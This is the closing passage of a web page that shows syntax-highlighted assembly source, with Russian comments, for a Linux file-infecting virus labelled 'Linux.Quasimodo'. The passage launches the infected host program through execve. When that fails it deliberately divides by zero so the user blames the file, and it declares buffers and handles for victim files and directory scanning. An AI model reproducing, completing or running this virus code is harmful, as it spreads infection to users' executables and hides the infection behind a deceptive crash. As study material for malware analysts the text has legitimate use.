                        </span><span class="sc5">orb</span><span class="sc0"> </span><span class="sc5">%al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%al</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">end_name</span><span class="sc0">
                        </span><span class="sc6">stosb</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_sign</span><span class="sc0">
</span><span class="sc5">end_name</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">stosb</span><span class="sc0">

# Поместим адрес строки с именем запускаемого файла в </span><span class="sc5">argv</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$name_buffa</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">args</span><span class="sc0">

# Запустим файл
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$11</span><span class="sc4">,%</span><span class="sc8">eax</span><span class="sc0">                   # </span><span class="sc5">Execve</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$name_buffa</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ebx</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$args</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%ecx</span><span class="sc0">                # </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">argv</span><span class="sc4">[]</span><span class="sc0">
                        </span><span class="sc5">movl</span><span class="sc0"> </span><span class="sc5">$envp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%edx</span><span class="sc0">                # </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">envp</span><span class="sc4">[]</span><span class="sc0">
                        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">$0x80</span><span class="sc0">

# Если мы еще работаем</span><span class="sc4">,</span><span class="sc0"> значит при запуске произошла ошибка</span><span class="sc5">.</span><span class="sc0"> В таком случае
# произведем деление на ноль </span><span class="sc4">-</span><span class="sc0"> пусть юзер думает</span><span class="sc4">,</span><span class="sc0"> что в файле ошибка</span><span class="sc5">.</span><span class="sc0">
                        </span><span class="sc5">xorl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">
                        </span><span class="sc5">divl</span><span class="sc0"> </span><span class="sc5">%eax</span><span class="sc0">

                        </span><span class="sc9">.data</span><span class="sc0">                   # Инициализированные данные
                        </span><span class="sc5">.ascii</span><span class="sc0"> </span><span class="sc3">"[Linux.Quasimodo] by Gobleen Warrior//SMF"</span><span class="sc0">
</span><span class="sc5">current_dir</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc5">.asciz</span><span class="sc0"> </span><span class="sc3">"."</span><span class="sc0">

                        </span><span class="sc10">.bss</span><span class="sc0">                    # Неинициализированные данные
</span><span class="sc5">flag1</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc5">.int</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">our_name_addr</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc5">.int</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dotted_fd</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">.int</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">victim_fd</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc5">.int</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">our_fd</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc5">.int</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dir_handle</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc5">.int</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">args</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc5">.int</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc5">.int</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">envp</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc5">.int</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">name_buffa</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc5">.skip</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">read_buffa</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc5">.skip</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span></div></body>
</html>
